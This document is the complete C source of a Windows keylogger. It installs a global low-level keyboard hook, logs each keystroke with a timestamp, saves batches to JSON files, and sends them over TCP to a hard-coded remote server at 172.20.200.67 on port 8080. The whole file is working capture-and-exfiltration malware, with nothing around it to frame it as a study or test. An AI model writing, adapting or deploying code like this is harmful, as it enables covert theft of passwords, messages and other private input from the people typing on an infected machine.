#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include "cJSON.h"
#include <time.h>
#include <ctype.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_ENTITIES 30
#define SERVER_IP "172.20.200.67"
#define SERVER_PORT 8080

typedef struct {
    char key[10];
    char curr_time[20];
} KeyPress;

KeyPress key_log[MAX_ENTITIES];
int key_count = 0;
SOCKET client_socket = INVALID_SOCKET;
int socket_initialized = 0;
int initialize_socket() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 0;
    }

    client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client_socket == INVALID_SOCKET) {
        printf("Socket creation failed: %ld\n", WSAGetLastError());
        WSACleanup();
        return 0;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Connection failed: %ld\n", WSAGetLastError());
        closesocket(client_socket);
        WSACleanup();
        return 0;
    }

    printf("Connected to server %s:%d\n", SERVER_IP, SERVER_PORT);
    return 1;
}

void send_to_server(const char* json_str) {
    if (!socket_initialized) {
        socket_initialized = initialize_socket();
        if (!socket_initialized) {
            printf("Failed to initialize socket connection\n");
            return;
        }
    }

    if (client_socket == INVALID_SOCKET) {
        printf("Socket is not valid\n");
        return;
    }

    int data_len = strlen(json_str);
    int total_sent = 0;
    
    while (total_sent < data_len) {
        int sent = send(client_socket, json_str + total_sent, data_len - total_sent, 0);
        if (sent <= 0) {
            printf("Failed to send data: %ld\n", WSAGetLastError());
            closesocket(client_socket);
            client_socket = INVALID_SOCKET;
            socket_initialized = 0;
            return;
        }
        total_sent += sent;
    }

}

void get_current_time(char* buffer, size_t size) {
    time_t now = time(NULL);
    struct tm* t = localtime(&now);
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", t);
}

void save_to_json() {
    if (key_count == 0) {
        printf("no keys to save\n");
        return;
    }
    
    cJSON *root = cJSON_CreateObject();
    cJSON *key_presses = cJSON_CreateArray();
    
    for (int i = 0; i < key_count; i++) {
        cJSON *key_obj = cJSON_CreateObject();
        cJSON_AddStringToObject(key_obj, "key", key_log[i].key);
        cJSON_AddStringToObject(key_obj, "time", key_log[i].curr_time);
        cJSON_AddItemToArray(key_presses, key_obj);
    }
    
    cJSON_AddItemToObject(root, "key_presses", key_presses);
    
    char filename[100];
    time_t now = time(NULL);
    struct tm* t = localtime(&now);
    strftime(filename, sizeof(filename), "keylog_%Y-%m-%d_%H-%M-%S.json", t);
    
    FILE* file = fopen(filename, "w");
    if (!file) {
        printf("cannot create file\n");
        cJSON_Delete(root);
        return;
    }
    
    char *json_str = cJSON_Print(root);
    fprintf(file, "%s", json_str);
    fclose(file);
    
    printf("saved %d keys to: %s\n", key_count, filename);
    send_to_server(json_str);
    
    free(json_str);
    cJSON_Delete(root);
    key_count = 0;
}

void add_key_to_log(const char* key_str) {
    if (key_count >= MAX_ENTITIES) {
        printf("log is full\n");
        save_to_json();
    }
    
    strncpy(key_log[key_count].key, key_str, 9);
    key_log[key_count].key[9] = '\0';
    
    get_current_time(key_log[key_count].curr_time, 20);
    
    key_count++;
}


LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *keypointer = (KBDLLHOOKSTRUCT *) lParam;
        if (wParam == WM_KEYDOWN) {
            switch (keypointer->vkCode) {
                case VK_LSHIFT:
                    printf("SHIFT ");
                    add_key_to_log("SHIFT");
                    break;
                case VK_SPACE:
                    printf("SPACE ");
                    add_key_to_log("SPACE");
                    break;
                case VK_BACK:
                    printf("BACKSPACE ");
                    add_key_to_log("BACKSPACE");
                    break;
                case VK_RETURN:
                    printf("ENTER ");
                    add_key_to_log("ENTER");
                    break;
                case 0x31:
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        printf("! ");
                        add_key_to_log("!");
                    } else {
                        printf("1 ");
                        add_key_to_log("1");
                    };
                    break;
                case 0x32:
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        printf("@ ");
                        add_key_to_log("@");
                    } else {
                        printf("2 ");
                        add_key_to_log("2");
                    };
                    break;
                case 0x33:
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        printf("# ");
                        add_key_to_log("#");
                    } else {
                        printf("3 ");
                        add_key_to_log("3");
                    };
                    break;
                case 0x34:
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        printf("$ ");
                        add_key_to_log("$");
                    } else {
                        printf("4 ");
                        add_key_to_log("4");
                    };
                    break;
                case 0x35:
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        printf("%% ");
                        add_key_to_log("%%");
                    } else {
                        printf("5 ");
                        add_key_to_log("5");
                    };
                    break;
                case 0x36:
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        printf("^ ");
                        add_key_to_log("^");
                    } else {
                        printf("6 ");
                        add_key_to_log("6");
                    };
                    break;
                case 0x37:
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        printf("& ");
                        add_key_to_log("&");
                    } else {
                        printf("7 ");
                        add_key_to_log("7");
                    };
                    break;
                case 0x38:
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                        printf("* ");
                        add_key_to_log("*");
                    } else {
                        printf("8 ");
                        add_key_to_log("8");
                    };
                    break;
                default:
                    if (isprint(keypointer->vkCode)) {
                        printf("%c ", keypointer->vkCode);
                        char key_str[2] = { (char)keypointer->vkCode, '\0' };
                        add_key_to_log(key_str);
                    }
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
    socket_initialized = initialize_socket();
    if (!socket_initialized) {
        printf("Warning: Could not connect to server. Data will only be saved locally.\n");
    }

    HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (keyboardhook == NULL) {
        printf("keylog failed\n");
    } else {
        printf("keylog started\n");
    }

    MSG msg;
    while( (GetMessage( &msg, NULL, 0, 0 )) != 0)
    { 
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (key_count > 0) {
        save_to_json();
    }

    UnhookWindowsHookEx(keyboardhook);
    
    if (client_socket != INVALID_SOCKET) {
        closesocket(client_socket);
        WSACleanup();
    }
    
    printf("Keylogger stopped.\n");
    
    return 0;
}